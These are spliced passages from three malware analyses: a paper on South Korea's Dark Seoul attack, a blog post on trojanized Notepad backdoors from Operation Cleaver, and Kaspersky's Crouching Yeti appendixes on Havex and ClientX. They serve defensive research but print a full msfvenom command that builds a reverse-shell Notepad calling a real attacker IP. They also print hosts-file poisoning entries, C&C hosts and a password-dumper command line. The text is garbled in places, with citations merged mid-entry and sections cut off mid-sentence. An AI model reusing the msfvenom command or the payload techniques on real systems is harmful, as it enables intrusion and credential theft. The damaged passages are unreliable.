 a.Check for internet connection: Downloads an image from naver.com.b.Local DNS cache poisoning: Redirects requests to certain Korean banking websites listed in Figure 2 to another server in Japan.c. Update download counter: Runs a counter script by opening http://myadmin2012.com/tong.htm.d. Makes itself persistent: Modifies the Windows registry by adding value with name “skunser” and data “C:\ntldrs\svchest.exe”, where it was previously copied to.e. Download backdoor: Downloads dropper file pao.exe from http://www.hisunpharm.com/files/File/product/ and stores it to C:\Program Files\tongji2.exe 
 f. Drops and execute batch file: schedules downloader every 30 minutes and ensures svchest.exe is started with Local System privileges.<figure> 
 126.114.224.53 www.kbstar.com 
 126.114.224.53 www.ibk.co.kr 
 126.114.224.53 www.shinhan.com 
 126.114.224.53 www.wooribank.com 
 126.114.224.53 www.hanabank.com 
 126.114.224.53 www.nonghyup.com
 <caption>Fig.2.New entries appended to Windows hosts file</caption>
</figure> 
 
<heading>4.Post-exploitation</heading> 

 The tongji2.exe module injects itself into iexplore.exe in an attempt to mask itself.Avast classified this as a backdoor Trojan and infostealer.This malware allowed attackers to control the computer as a compromised zombie part of a wider botnet network – a theory suggested by Alienvault <fn>[9]</fn> – which then wiped hard disks, and harvested personal information.Examination of the file names and the Safeengine executable protector suggest that the malware was made in China.Although capable of executing many functions, only the
following were widely utilized in the attack:

 a. Antivirus disablement: Malware attempts to disable Ahnlab and Hauri antivirus.b.Command & control (C&C): Using a simple XOR loop for encryption, the malware attempts to connect to laoding521.eicp.net over port 889 to communicate with the attackers.c. Harddisk wiper: Symantec identified Trojan.Jokra as the malware component that wiped harddisks in the attack.It is likely that it was downloaded onto the victim’s computer after receiving an instruction by the C&C servers.The malware overwrites the master boot record (MBR) and the rest of the harddisk with the strings “PRINCIPES” or “HASTATI.”.Other attached drives or removable devices may also be targeted.The malware then forces the computer to restart thus making it unusable.An interesting feature of this malware is that it has components to wipe out harddisks on both Windows and Linux platforms.Detailed analysis of Jokra can be found here <fn>[10]</fn>.d. Information harvesting: After gaining root privileges the attackers can intercept any information that goes in or out of the infected computer.However the most apparent information taken was user credentials.As a result of DNS poisoning, users believe they are accessing the authentic internet banking website, but are decepted into interacting with a fake website.An error message pops up stating that the user’s computer was infected by a virus and that for security reasons they need to apply for a fraud prevention service.If the user clicks the OK button, the user is directed to a page requesting their name and national identification number.If the format entered is correct, the user is then asked to fill in more details including address, phone number, etc..
</section>

<section>
<heading>C.CASE STUDIES: PREVIOUS MAJOR CYBER ATTACKS</heading>
<heading>1.Stuxnet</heading>
 Stuxnet was discovered in July 2010, but the earliest known variant is confirmed to have existed since 2007 <fn>[11]</fn>.Stuxnet caught many security researchers and professionals by surprise, being the first advanced malware of its kind.According to Symantec’s report <fn>[12]</fn>, Stuxnet is a complex threat that was primarily written to target an industrial control system (ICS) or set of similar systems.A vast array of components was implemented in the malware including four 0-Day exploits, a windows rootkit, antivirus evasion techniques, complex process injection and hooking code, network infection routines, peer-to-peer updates, a command and control interface, as well as the first ever PLC rootkit.Stuxnet’s main payload has the main purpose of modifying code on Siemens industrial PLCs in order to sabotage the system.It is widely believed that Iran’s Natanz nuclear Fuel Enrichment Plant (FEP) was the intended target.Hosts in five domains of organizations based in Iran were heavily infected over 3 attack waves.The deliberate containment of the malware to targets in Iran is also apparent from the number of hosts infected worldwide, which reached only around 100,000 with approximately 60% being in Iran.This attack has been claimed to setback Iran’s nuclear program by several years as 1,000 out of 9,000 centrifuges were disabled and had to be replaced <fn>[13]</fn>.The initial attack point is likely to be via a USB infection.<heading>2.10 days of Rain</heading> 

 On March 4, 2011, exactly 20 months after a similar incident during the U.S.Independence Day celebrations of 2009, a botnet based in South Korea launched DDoS attacks against 40 websites affiliated with South Korean government, military, and civilian critical infrastructure as well as U.S. forces based in Korea <fn>[14]</fn>.The botnet was dynamically updated via new malware binaries, launched a DDoS non-stop for more than a week, and then wiped the harddisks with zeroes, overwriting the MBR making the machines unusable.This attack used malware with a much higher level of sophistication than is necessary to launch a trivial distributed denial of service (DDoS) attack.Encryption of code and configurations using cipher algorithms such as the Advanced Encryption Standard (AES), RSA, and Rivest Cipher 4 (RC4) enabled them to evade detection and prolong analysis.A multitier botnet architecture included 40 C&C servers distributed across the globe including servers in the USA, Taiwan, Saudi Arabia, Russia, and India.Highlighting the overkill in this attack, McAfee went so far as to call it “analogous to bringing a Lamborghini to a go-cart race” <fn>[15]</fn>
 
Considering the limited timeframe scope and target list, McAfee suggested the motivation of the attack was a cyber war exercise to test the preparedness of South Korea’s cyber defense capabilities and to better understand the technical requirements for a successful campaign.<heading>3.SK Communications – CyWorld</heading>

 In July 2011 SK Communications became the victim of an attack that resulted in the loss of the personal details of 35 million users <fn>[16]</fn>.The users of CyWorld and Nate, services owned by SK Communications, were affected by this attack.Judging from the sophistication of the attack and the time needed for planning it, researchers concluded that the attack was likely to be carried out by an Advanced Persistent Threat.Between July, 18 and 25, more than 60 computers were infected then used to gain access to the user databases.The launch point was a South Korean software company’s update server, normally used to deliver software updates to customers <fn>[17]</fn>.The attackers compromised the server and created a Trojan that would be downloaded to user computers during a routine update.Poor change management policy resulted in the full trust of software updates, allowing attackers to fully exploit this weakpoint.During this time attackers used C&C servers to monitor the activities on the infected machines and uploaded tools on a previously compromised legitimate Taiwanese website.An elaborate infrastructure of waypoints and C&C servers was created to make tracing the sources of their activities difficult.In-depth investigation of the attack reveal that preparation went back as early as September 2010 before finally culminating in the compromise of the user databases between July 26-28, 2011.Comparing Dark Seoul with previous attacks shows that it was technically low in sophistication while causing high impact to the organizations affected.An intuitive indicator ofthis sophistication is that it was completely preventable if the organizations had used existing software updates and antivirus solutions, whereas prior attacks could not have been detected.However judging from the high number of infections, services disrupted, and the fact that information was being harvested from the infected machines at least 8 months <fn>[18]</fn> before the d- day wipeout, we consider the impact to be high.<table> 
<caption>Table 1.Comparison with Previous Attacks.</caption>
 Dark
 Stuxnet
 SK Comm 10 days of Seoul
 Metric (2007-
 (2011) rain (2011) (2013)
 2010)
 VERY VERY
 Sophistication HIGH LOW
 HIGH HIGH
 VERY
 Impact HIGH HIGH HIGH
 HIGH
 #of Infections >100,000 60 >100,000 >48,000
 Nuclear 35 million 8 billion
 Losses DDoS
 Program users KRW
 Time Before >10
 >3 years >1 year >8 months
 Detection months
</table>
</section>

<section>
 <heading>D.ADVANCED MALWARE DESIGN</heading>
 <heading>1.Multiple Propagation Vectors</heading>
 To increase the probability of successfully infecting the target systems, various propagation vectors should be embedded into the malware.The most likely attack vector is social engineering via phishing emails, USB sticks, and other techniques.Although people can be used as the initial point of entry, propagation needs to continue laterally through the network till the specific target host is reached.During this process the malware may need higher privileges (e.g.root) and further exploits will be utilized.Therefore the persistent adversary will need to consider multiple vectors to infiltrate target systems.<heading>2.0-day Exploits</heading> 
 
 The problem with publicly published vulnerabilities is people can defend against them.0-day exploits are written to exploit vulnerabilities that have not been disclosed to the public nor the concerned software vendor.These exploits are at the core payload of any advanced malware, and are virtually unstoppable until vendors release a patch or anti-virus providers come up with a signature definition.The only other method of minimizing the 0-day threat is by actively designing security into software.Dark Seoul did not use any 0-days.<heading>3.Evasion Techniques</heading> 
 
 The deployment of anti-virus software, intrusion detection systems, firewalls and other malware detection or prevention technology has done much to defend against many attacks.Advanced malware bypasses these defenses by employing techniques such as dynamic botnet obfuscation, network based fragmentation and session splicing, application or protocol violations, disabling intrusion detection systems (IDSs), to more advanced techniques such as encryption and code reuse attacks <fn>[19]</fn>.Carefully crafted exploits can avoid even advanced heuristic detection algorithms used in today’s anti-virus software.Evasion techniques are crucial for successful attacks against high level targets, such as in the case of the Iranian nuclear program.</section> 
 
<section> 
<heading>E.CONCLUSION</heading> 
 Dark Seoul was a low tech threat which managed to escalate into a high impact attack.Successful in carrying out its goals, the malware was lacking in many areas that would be typically found in attacks by advanced persistent threats.We highlighted the components of the malware used and the possible design principles that could have been employed to make the attack more sophisticated.South Korea is more at risk now than before the attack, as now adversaries less capable than advanced persistent threats realize they could also successfully perform damaging attacks.Undertaking the needed remediation strategies to prevent similar attacks as well as understanding the anatomy of more advanced malware is vital for mounting an adequate defense against the advanced cyber threats.</section>

<noncontent> 
<heading>ACKNOWLEDGEMENT</heading> 
 
 This research was supported by Basic Science Research 
Program through the National Research Foundation of Korea 
 
(NRF) funded by the Ministry of Education, Science and 
Technology (grant number: 2012-0008447).</noncontent>

<footnote> 
<heading>REFERENCES</heading> 
 
[1] “South Korea blames North for bank and TV cyber-attacks,” BBC News, 
 [online] 10 April 2013, Available: 
 http://www.bbc.co.uk/news/technology-22092051 (Accessed: 18 April 
 2013) 
[2] He-suk Choi.“Seoul blames Pyongyang for cyber attacks,” The Korea
 Herald, [online] 10 April 2013, Available:
 http://www.koreaherald.com/view.php?ud=20130410000766 (Accessed:
 18 April 2013)

[3] J. Horejsi.“Analysis of Chinese attack against Korean banks,” Avast!Murchu, S. Doherty, and E. Chien, “Stuxnet 0.5:
 The Missing Link,” Symantec Security Response [online] 26 February
 2013, Available:
 http://www.symantec.com/content/en/us/enterprise/media/security_respo
 nse/whitepapers/stuxnet_0_5_the_missing_link.pdf
[12] N. Falliere, L. O. Murchu, and E. Chien, “W32.stuxnet dossier,”
 Symantec, Symantec Security Response [online] February 2011.[online].Marpaung, M. Sain, H.J.Lee, “Survey on Malware Evasion
 Techniques: State of the Art and Challenges” in 14th International
 Conference on Advanced Communication Technologies, 2012, pp 744-
 749.</footnote>
</doc><doc>
<header>Operation Cleaver: The Notepad Files</header>


<figure></figure>
<section>
You see some strange stuff out there on the networks where attackers are active.Certainly the stash of files
unearthed during the Operation Cleaver investigation included much of the bizarre and something of the
terrible.Brian Wallace, who led the investigation, shared a mysterious set of samples with me awhile back,
and now that Operation Cleaver is public, I'll relate the lurid technical details.</section>
<section>
<heading>The Notepad Files</heading>

The files in question were found in a dim and dusty directory on a forlorn FTP server in the US,
commingled with the detritus of past attack campaigns and successful compromises.They were at once
familiar and strange, and they were made still stranger and more perplexing by their location and the
circumstances of their discovery.All around them was a clutter of credential dumps, hacking utilities,
RATs, and even legitimate software installers, but the files in question were none of these.They were
Notepad.<figure></figure>

<caption>Figure 1.The Notepad Doppelgängers.</caption>

Of course, a purloined Notepad icon in malware is nothing new, but something different was going on
here.Within each of the two families, all of the samples had the same main icon, file size, and version
information, yet each one had a distinct hash.At the time, only one of those five hashes existed on the
internet: the official 32-bit Simplified Chinese Notepad from Windows XP x64 / Windows Server 2003.Suspecting that the remaining Notepads were derivatives of official Windows files, we associated the other
member of the first family with the confirmed legitimate Notepad, and we matched the second family with
the 32-bit US English Notepad from Windows 7 (not present in the original set).A summary of Notepad samples dug from the attackers' FTP drop, with the official Windows 7
Notepad appearing at bottom.It and the official Windows XP/2003 Notepad are represented in green.</caption>

Things got interesting when we started comparing the Notepads at the byte level.The image below depicts
some byte differences between the original Windows 7 Notepad and samples NOTEPAD2.EXE and
Notepad3.exe:


<figure></figure>

<caption>Figure 2.The timestamps were rolled back by weeks to months relative to the legitimate progenitors' timestamps;
we don't know why.The entry points retreated or advanced by hundreds of bytes to dozens of kilobytes,
for reasons we'll explore shortly.And the checksums were all zeroed out, presumably because the file
modifications invalidate them, invalid non-zero checksums are a tip-off, and zeroing is easier than
recomputing.So what's the story with all those other modifications?In all cases they seem to be confined to the ".text"
section, centrally located to avoid the import directory, debug directory, load configuration directory, and
import address table.This makes sense as a general precaution, considering that corrupting the import
directory would unhelpfully crash the Windows loader during process initialization.The following image
illustrates the distribution of modifications relative to these structures.<figure></figure>

<caption>Figure 3.File locations of modifications (red) and the PE structures they avoid (gray).From left to
right, the four vertical bars represent the ".text" sections of NOTEPAD2.EXE, Notepad3.exe,
Notepad4.exe, and notepad10.exe, as compared to the original Notepad from their respective families.The Import Address Table (IAT), original entry point (OEP, green), malware entry point (EP, yellow),
load configuration directory (LC), import directory (Imp), and debug directory (Dbg) are labeled.</caption>

While the arrangement of the structures varies among families, it's clear from the figure above that the
region between structures containing the original entry point has in each case been filled with
modifications.Notably, each sample has a short run of consecutive modifications immediately following
the new entry point, and then a longer run elsewhere in the region.Presumably, both runs are injected
malicious code, and the other modifications may well be random noise intended as a distraction.Since
there are no other changes and no appended data, it's reasonable to assume that the code that makes a
Notepad act like Notepad is simply gone, and that the samples will behave only maliciously.If true, then
these modifications would represent a backdooring or "Trojanization" rather than a parasitic infection,
and this distinction implies certain things about how the Notepads were made and how they might be
used.</section>
<section>
<heading>Tales from the Code</heading>

Let's take a look at the entry point code of the malicious Notepads and see if it aligns with our
observations.The short answer is, it looks like nonsense.For instance, the JNP
instruction at 010067FF is a two-byte instruction, and the JNZ branch at 010067F9, if satisfied, jumps to
the JNP instruction's second byte at 01006800.That byte begins a different two-byte instruction, which
incorporates what would have otherwise been the first byte of the instruction after the JNP, meaning its
successor will start in the middle of JNP's successor, and so on.The two execution paths usually (but don't
necessarily) converge after a few instructions.The outcome of these instructions depends on the initial state of the registers, which is technically
undefined.Seeing code operate on undefined values typically suggests that the bytes aren't code after all
and so shouldn't have been disassembled.But keep looking.Notice that there are no memory accesses
(which could raise an access violation), no stack pointer manipulation (which could cause a stack overflow
or underflow), no division instructions (which could raise a divide exception), no invalid or privileged
instructions, no interrupts or indirect branches--really, no uncontrolled execution transfers of any kind.The code
seems to abruptly change character after the jump at 01006891, transitioning from gibberish to a string of
short sequences connected by unconditional branches.This transition corresponds to a jump from the end
of the short run of modifications (01006896) after the malware entry point to the beginning of the longer
run of modifications (01005747) a few kilobytes before it.(See the third column in Figure 3.)In the disassembly above, the first sequence of green lines is a clear CALL-POP pair intended to obtain a
code address in a position-independent way.(An immediate address value marked with a relocation would
be the orthodox way to obtain a code pointer, but preparing that would have involved modifying the
".reloc" section.)No way is this construct a coincidence.Furthermore, the blue lines strongly resemble the
setup for a VirtualAlloc call (VirtualAlloc(NULL, 0x1A9, MEM_COMMIT,
PAGE_EXECUTE_READWRITE)) typical of a deobfuscation stub, and the second set of green lines
invoke the CALL-POPped function pointer with what one might readily assume is a hash of the string
"VirtualAlloc".(It is.)There's plenty more to observe in the disassembly, but, let's fast-forward past it.<list>
windbg -c "bp kernel32!VirtualAlloc ; g" Notepad4.exe...
</list>
<figure></figure>


<caption>Figure 4.VirtualAlloc breakpoint hit.The parameters on the stack and the state of the registers are as
expected.</caption>
<list>
g poi(@esp) ; ba w 1 @eax+@esi-1 ; g...
</list>

<figure></figure>

<caption>Figure 5.Memory write (hardware) breakpoint hit after the last (0x1A9th) byte is written to allocated
memory.</caption>

And now we can dump the extracted code from memory.But check out the instructions just above it referencing "[eax+19]".The code is in a sense self-modifying,
flowing right into a portion of itself that it XOR decodes.The first decoded instruction is "LOOP
00100010" (0xD6 ^ 0x34 = 0xE2, the opcode for LOOP), which will execute the XOR loop body 99 more
times (CL - 1 = 0x63 = 99) and then fall through to the newly-decoded code.(For brevity, we cut each listing at the first
sign of encoding.)What is the point that it eventually gets to?You'd be forgiven for assuming that the tremendous amount of effort poured into obfuscation means
there's some treasure beyond all fables at the bottom of this erstwhile Notepad.Sorry.It just downloads
and executes a block of raw code.(Spoiler: it's actually a Metasploit reverse connect stager.)Here is its
behavior summarized as function calls:
<list>
kernel32!LoadLibraryA("ws2_32")

ws2_32!WSAStartup(...)

s = ws2_32!WSASocketA(AF_INET, SOCK_STREAM, ...)

ws2_32!connect(s, { sin_family = AF_INET, sin_port = htons(12345), sin_addr =
108.175.152.230 }, 0x10)

ws2_32!recv(s, &cb, 4, 0)

p = kernel32!VirtualAlloc(NULL, cb, MEM_COMMIT, PAGE_EXECUTE_READWRITE)

ws2_32!recv(s, p, cb, 0)

p()
</list>
The above is known to be true for Notepad3.exe, Notepad4.exe, and notepad10.exe.NOTEPAD2.EXE
doesn't seem to want to run, for reasons we didn't bother to troubleshoot for the bad guys.</section>
<section>
<heading>Denouement</heading>

Unfortunately, we never did obtain a sample of the code that might have been downloaded.The key to that
enigma-embedded, mystery-wrapped riddle is forever lost to us.The best we can do is read what's written
in the Notepads and speculate as to why they exist at all.Clearly whatever generator created these Notepads is far, far beyond the technical understanding of the
Cleaver team.It stands to reason that there is a generator--no chance these were crafted by hand--and that
its sophistication is even greater than that of its output.Something like that wouldn't be used only once.Something like that, if this team was able to get ahold of it, must be out there.Turn the right corner of the
internet, and you can find anything...

Well it so happens that we did eventually find it.Some of you have no doubt suspected it all along, and
now I'll humbly confirm it for you: the Notepads were, in their entirety, generated by Metasploit.Something along the lines of "msfvenom -x notepad.exe -p windows/shell/reverse_tcp -e
x86/shikata_ga_nai -i 5 LHOST=108.175.152.230 LPORT=12345 > Notepad4.exe".The "msfvenom" tool
transmogrifies a Metasploit payload into a standalone EXE, and with the "-x" switch, it'll fuse the payload-
-encoded as desired--into a copy of an existing executable, exhibiting exactly the behavior we just
described.Omne ignotum pro magnifico.Perhaps the more bizarre a thing is, the less mysterious it
proves to be.However, we're still left to wonder what Cleaver was up to when they generated all those Notepads.One
conclusion Brian proposed is that they're intended as backdoors--replacements for the legitimate Notepad
on a compromised system--which would enable Cleaver to regain access to a system at some
indeterminate time in the future, the next time a user runs Notepad.The team demonstrated a similarly
intentioned tactic with a connect-back shell scheduled to run in a six-minute window each night; the
Notepad replacement, while more intrusive, could be another example of this contingency planning
tendency.Or maybe the Notepads were only an aborted experiment, attempted and shelved, forgotten in a flurry of
compromises and criminal activity.If nothing else, they made for an unexpected bit of mystery.</section>

</doc><doc>
<cover>Crouching Yeti — Appendixes
Kaspersky Lab Global Research and Analysis Team




Version 1.0
July 2014
</cover>

<toc>
Contents
I.Appendix 1: Indicators of compromise								3
II.Appendix 2: Havex loader – detailed analysis							             5
III.Appendix 3: The Sysmain backdoor – detailed analysis					      47
IV.Appendix 4: Ddex loader – detailed analysis							              54
V. Appendix 5: The ClientX backdoor – detailed analysis					        57
VI.Appendix 6: Karagany backdoor – detailed analysis						         65
VII.Appendix 7: C&C Analysis									71
VIII.Appendix 8: Victim identification								                     73
IX.Appendix 9: Hashes										81
X.Appendix 10: Delivery methods – detailed analysis						          86
	10.1.Hijacked installers of legitimate software						86
	10.2.Exploitation										90
	10.3.Obvious Metasploit Rips								102
	       10.4.Changing Lights Out exploit sites’ download flow					 104
	       10.5.Related Targeted Software and CVE Entries					        105
XI.Appendix 11: Malicious Domains and Redirectors						            108
XII.Appendix 12: Previous and parallel research						              115

</toc>


<noncontent>TLP: Green                             For any inquire please contact intelreports@kaspersky.com
                                                                                                    3</noncontent>


<header>I.Appendix 2:
Havex loader – detailed analysis</header>
<section>
<heading>2.1.Base64 encrypted string MTMxMjMxMg== (“1312312” after decoding) is used as a
             XOR key.Encryption

</list>
The 2nd stage modules are usually base64 encoded, bzip2 compressed and XORed using the
recurrent “1312312” key.In some cases, the malware can also use one 1024 bit RSA key which is embedded in the config
section of the binary.0000020: 99fe 0b2b 1c8b 204e f2bd 02eb 1d16 8fbd ...+.. N........
0000030: 7f30 317f 5cd7 8f8d bcf3 4fa4 5269 2d99 .01.\.....O.Ri-.0000040: 56f9 1d26 22f1 3dbb 439e 1e43 864b 5052 V..&”.=.C..C.KPR
0000050: 8f29 9b2d 8077 303d 51c6 770a 6699 19a4 .).-.w0=Q.w.f...0000060: d3d7 cbdc a19d f52a 91eb 432f ed0b 49e1 .......*..C/..I.</section>
<section>
<heading>Differences between versions</heading>


It seems there are over 50 different versions of Havex malware, internally identified by hex numbers
from 01 to 044 (the latest known at the time of writing).Versions 01 – 019: Contain strings that may be related to password harvesting, even though the
code that would actually search for the passwords was not identified inside this component.It’s
possible that these strings are part of the configuration and are used by downloaded modules as
a list of names of processes that the malware wants to hijack in order to steal passwords from the
memory.Versions 017 – 037: Instead of the GET request, send a POST request to the C2.The contents of the
POST differ between versions.Versions 01A – 038: Check proxy settings in the registry and use them if required.Versions 01B – 044: Use an asymmetric crypto algorithm (RSA) to decrypt the downloaded
binaries.(Previous versions use simple XOR based encryption).Versions 020 – 025: Check the Internet connection by trying to connect to google.com:


CONNECT google.com:80 HTTP/1.0


Collect system information, write it to *.yls file.Later, append these contents to the POST request
string.*
     C:\Documents and Settings\%User%\My Documents\*.*
     C:\Documents and Settings\%User%\My Documents\Downloads\*.*
     C:\Documents and Settings\%User%\My Documents\My Music\*.*
     C:\Documents and Settings\%User%\My Documents\My Pictures\*.*
     C:\Program Files\*.*
     Root directory of all fixed and removable drives.</list>

Version 025: Contains a debugging symbols path, which may suggest that the project was internally
called “PhalangX”:
d:\Workspace\PhalangX 3D\Src\Build\Release\Phalanx-3d.ServerAgent.pdb


Version 038 – 040: Does not contain the routine that collects system info, yet the malware checks
for potential previously created *.yls files, and appends the content of them to the POST request.Instead of values hardcoded in the binary, this is a first version to use a resource to store encrypted
config.Detailed analysis of this version is included in this appendix.Version 043 – 044: Size similar to 037 and earlier versions; dll name is now 0XX.dll (where XX is
version number), the <unk> value in config is now 29 bytes long.Unexpective error
   Was found %i hosts in LAN:
   Hosts was’t found.Start finging of OPC Servers...
   Was found %i OPC Servers.Programm finished
   Thread %02i return error code: <error_code>
   Start finging of OPC Tags...
        %i)[%s\%s]
        Saved in ‘OPCServer%02i.txt’
        %i)[%s] (not aviable)
   Thread %02i was terminated by ThreadManager(2)
   Thread %02i running...
   Thread %02i finished.Outlook module


SHA-256:	 0859cb511a12f285063ffa8cb2a5f9b0b3c6364f8192589a7247533fda7a878e
Size: 		    261120
Compiled: 	 Wed, 07 May 2014 13:22:21 UTC

</list>
This module looks for outlook.nk2 files, gets the contact data from inside them and writes it to the
*.yls file.Data is as always bzip2 compressed and 3DES encrypted.Config is stored in the resource
HYT 017D (bzip2 compressed and encrypted with same xor key as always).Config consists of an RSA
key ID (29 bytes), base 64 bit encodedRSA key (1024 bit) and nk2 file path (39 bytes).outlook.nk2is the file where Outlook <= 2007 stores contacts details in order to use them in its
AutoComplete feature.This functionality is not present in versions >=026 - it was probably moved into this separate
module around that time.The EXE file is
saved in %TEMP%\<rand>.exe and run using ShellExecuteExW.Besides the binary, resource HAJ 3A0 contains hex string: 30 0A 30 0A 34 38 36 34 30 0A
</section>
<section>
<heading>3rd stage tool: network scanner</heading>

<list>
SHA-256:	9a2a8cb8a0f4c29a7c2c63ee58e55aada0a3895382abe7470de4822a4d868ee6
Size: 		    48640
Compiled: 	 Wed, 06 Nov 2013 11:27:38 UTC

</list>
This PE EXE file was dropped and run by EXE dropper module (2120c3a30870921ab5e0314
6a1a1a865dd24a2b5e6f0138bf9f2ebf02d490850).Its main functionality is to scan the local
network looking for machines listening on specified ports.All information is logged into a
%TEMP%\~tracedscn.yls file in plain text.]End


PSW dropper module


SHA-256:	71e05babc107f5e52f1a4c3ea6261c472d2649c0b179395304c420eaa54e2062
size:		    1427968
compiled:	 Mon, 09 Jul 2012 07:38:11 UTC

</list>
This module is used to decompress (bzip2) and drop a password dumping tool from resource DLL1
A8 409 to %TEMP%\bp.exe and run it with the following command:
%TEMP%\bp.exe %TEMP%\~tmp1237.txt”
Saved log is then copied to %TEMP%\<rand>.tmp.yls file.This is a customized (?)version of BrowserPasswordDecryptor 2.0 - a free password recovery tool,
developed by SecurityXploded:

<list>
hxxp://securityxploded.com/browser-password-decryptor.php
</list>
</section>

<section>
<heading>Description from the developers’ website:</heading>


Browser Password Decryptor is the FREE software to instantly recover website login passwords stored by
popular web browsers.Currently it can recover saved login passwords from following browsers:
<list>

•	 Firefox
•	 Internet Explorer
•	 Google Chrome
•	 Google Chrome Canary/SXS
•	 CoolNovo Browser
•	 Opera Browser
•	 Apple Safari
•	 Comodo Dragon Browser
•	 SeaMonkey Browser
•	 SRWare Iron Browser
•	 Flock Browser

</list>
<list>
Features:
</list>

•	 Instantly decrypt and recover stored encrypted passwords from popular web browsers.•	 Right Click Context Menu to quickly copy the password
•	 Recover password of any length and complexity.•	 Automatically discovers all supported Applications and recovers all the stored passwords.•	 Sort feature to arrange the recovered passwords in various order to make it easier to search through
   100’s of entries.•	 Save the recovered password list to HTML/XML/Text/CSV file
•	 Easier and faster to use with its enhanced user friendly GUI interface.•	 Support for local Installation and uninstallation of the software.The
encryption library used by the modules (as well as the most recent versions of Havex) is handled by


<noncontent>TLP: Green                                         For any inquire please contact intelreports@kaspersky.com
                                                                                                             23</noncontent>

the RSAeuro library.They recompiled the library several times using different compiler settings and
optimization (depending of modules/Havex) which makes fingerprinting the functions a bit tedious.Once the log has been compressed using bzip2, the modules use the library to generate a random 192 bit
3DES key (168 bit effective) and a 64 bit Initialization Vector.It is essentially creating the PKCS #1 padding block around the key and then calling the
rsapublicencrypt function.The final encrypted log file layout looks like the following: (important parameters overwritten for
clarity):

<figure></figure>


The YLS file format can be described as follows:


•	 SIZE OF RSA Identifier: 0x29 in the figure above
•	 RSA ID: “39ee448cf196304cfe9c6b1c2e436”.(Used by attackers to identify which RSA key was
   used to encrypt the 3DES Key.•	 BLOCKSIZE: 128 bytes (24 bytes from 3DES key and 104 from PKCS padding block)
•	 ENCRYPTED 3DES KEY : In yellow on the figure above, replaced by “C”
•	 3DES Initialization Vector: In red on the figure above, replaced by “I”.Mandatory to decrypt
   logs.•	 3DES ENCRYPTED LOG bytes


<noncontent>TLP: Green                                          For any inquire please contact intelreports@kaspersky.com
   26</noncontent>

Only the attackers can decrypt such a log file.They can identify which Public RSA Key was used
from the identifier, and decrypt the 3DES key using their Private RSA Key.From there, they can use
the 3DES Key and the Initialization Vector which is present in clear form to decrypt the log file.Appendix 3:
The Sysmain backdoor – detailed
analysis</header>

<section>
<heading>Detailed analysis of first identified sample of SYSMAIN RAT.tmp
        •	 Read content that is between tags <B6></B6>, xor it with 0x0A and write it to the %TEMP%\
           Low\~ldXXXX.TMP file, then load this file to the memory

</list>
</section>

<noncontent>TLP: Green                                          For any inquire please contact intelreports@kaspersky.com
                                                                                                        57</noncontent>


<header>V.Appendix 5:
The ClientX backdoor – detailed analysis</header>
<section>
The ClientX backdoor binaries were found in an open directory on one of the C2 servers.They consist of two .NET files.One of them is called client.exe, which is the main malware
component.The second is library.dll, which provides functions to client.exe.<list>

Compiled on: Mon Mar 04 13:23:46 2013
File size: 81 920 bytes
SHA256: D449AEDACCA27E61B8FAE3FCF0E40C29C53ED565E23ED64B6F5528287B547BD2

</list>
The client.exe file has built-in debug messages, but the binary was compiled as a GUI application.It then creates a Mutext called “clientX”
to check whether other instances of the malware are already running.If no other instance of the
malware is found, it will write “One instance” and continue execution.Otherwise, it will print out
“More than one instance” and terminate.Immediately after creating the Mutex the “cleaner” method is called.(Debug message: “upd
cleaner”).This method looks for all executables in the current folder and deletes files with names
that do not match some file property criteria.This is used to delete older versions of the RAT after a successful update (See the commands UPD
later described in this appendix)


<heading>5.1.Main loop</heading>


The backdoor then starts the main loop, which is an infinite while loop.(Debug message: “main
loop”).<heading>5.1.1 Setting check</heading>


Some settings are checked by the backdoor.(Debug message: “setting check”)
The Settings Check method from the check class is used.<heading>5.1.2 RegIeDir</heading>


After the debug message “RegIeDir”, the following registry key is opened “HKEY_CURRENT_USER\\
SOFTWARE\\Microsoft\\Internet Explorer” and the subkey “InternetRegistry” is checked.If not
found, a subkey is created.That part is closed by a debug message: “RegIeDir done”.<heading>5.1.3 Run-work</heading>


The “run-work” debug message indicates that the malware is gathering two registry keys for later
use.“KeyRun” will hold “SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run”, either from
“HKEY_LOCAL_MACHINE” or “HKEY_CURRENT_USER” depending
on access rights.“KeyWork” will hold “SOFTWARE\\Microsoft\\Windows\\CurrentVersion”, either from “HKEY_
LOCAL_MACHINE” or “HKEY_CURRENT_USER” depending
on access rights.The “CheckAccessLM” and “CheckAccessCU” methods check for access to Local Machine and Current
User, respectively.If the LOCAL MACHINE isn’t accessible the following error message is displayed “LM error: error
reason”, otherwise “LM no error”.If the CURRENT MACHINE isn’t accessible the following error message is displayed “CU error: error
reason”, otherwise “CU no error”.If for some reason, neither “SOFTWARE\\Microsoft\\Windows\\CurrentVersion” from Local
Machine nor Current User is accessible, the following
“HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Internet Explorer\\InternetRegistry” will be
used for “KeyWork”.Once the registry keys are identified, the debug message “run-work done” is displayed.The malware prints both KeyRun and Keywork and continues execution.A subkey is added to KeyRun to automatically start the malware when Windows reboots.The name of that subkey comes from the “version information” entry of the resource section where
the internal and original file name can be found.<noncontent>TLP: Green                                         For any inquire please contact intelreports@kaspersky.com
   60</noncontent>

The full path of the malware is set and the malware can now survive reboot.The debug message
“work” is displayed.<heading>5.1.4 Run-work done 2</heading>


The next step focuses on the Keywork registry key.The following subkeys are checked and created if not present in Keywork\\[name_from_version_
information] : “done”, “doneEXT”, “work”, “settings” and “servers”.They hold not any value at this point.This part is ended by a debug message: “run-work done 2”


<heading>5.1.5 Generating BotID and filling subkeys</heading>


Immediately after checking for special subkeys, the IDget method is called.If the “id” subkey doesn’t exist, the method IDset is called and a new BOTID is created and stored as
a Base64 encoded string.Afterwards, the IDget method is called and the BOTID is Base64 decoded from the registry and
saved for later use in prSettings.id.It does the same for “prSettings.priv”, “prSettings.pub” , “prSettings.timeout” and “prSettings.servers”, each time checking whether a value is already set, and creating one if not.The developers made a mistake.The “prSettings.priv” is set using the IDget method instead of
the KeyPrivGet method.However, this makes little difference since KeyPubGet, KeyPrivGet and
IDget are wrappers to the GenerateID methods.<heading>5.2 Network communication - AnsSend</heading>


The next method called by our trojan is “AnsSend”.It stands for “Answer Send”.It starts with the debug message “ANSWER”.This part of the code looks into the registry, specifically into the “KeyWork\\[name_from_version_
information]\\done” and doneEXT subkeys
to see if there is anything ready to be posted to the C&C server.Those subkeys should be empty
at this stage, since the Answers are only created after a task received from the C&C server is
completed.Here is an example of such a file:



The date of the post can be found, the base64 encoded C&C server and the unicode string Answer,
modified in this example.This is how the attackers get an answer (result) from a given task.<heading>5.3 Network communication - WorkReceive</heading>


